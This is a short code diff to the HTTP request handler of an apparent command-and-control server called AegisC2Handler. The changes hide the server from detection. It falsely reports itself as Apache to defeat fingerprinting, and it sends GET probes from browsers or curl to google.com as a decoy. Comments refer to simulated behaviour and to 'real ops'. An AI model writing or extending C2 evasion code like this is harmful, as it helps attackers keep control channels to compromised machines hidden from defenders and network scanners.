@@ -41,6 +41,18 @@ class AegisC2Handler(http.server.BaseHTTPRequestHandler):
         # Suppress default logging to keep CLI clean
         pass
 
+    def version_string(self):
+        # Override default server version string to prevent fingerprinting
+        return "Apache"
+
+    def do_GET(self):
+        # Handle GET requests (e.g. browser/curl probes) gracefully
+        # Return a decoy 404 or redirect to a benign site
+        self.send_response(302)
+        self.send_header('Location', 'https://www.google.com')
+        # Server header is added automatically by send_response calling version_string()
+        self.end_headers()
+
     def do_POST(self):
         # Extract Node ID from URL or Header (simulated)
         # In real ops this would be encrypted. Here we parse the URL path.
@@ -66,7 +78,7 @@ class AegisC2Handler(http.server.BaseHTTPRequestHandler):
         self.send_response(200)
         self.send_header('Content-type', 'application/octet-stream')
         self.send_header('Connection', 'close')
-        self.send_header('Server', 'Apache') # Masquerade
+        # self.send_header('Server', 'Apache') # Masquerade - handled by version_string() override
         self.end_headers()
 
         # In a real impl, we would wrap response_body in an encrypted envelope.
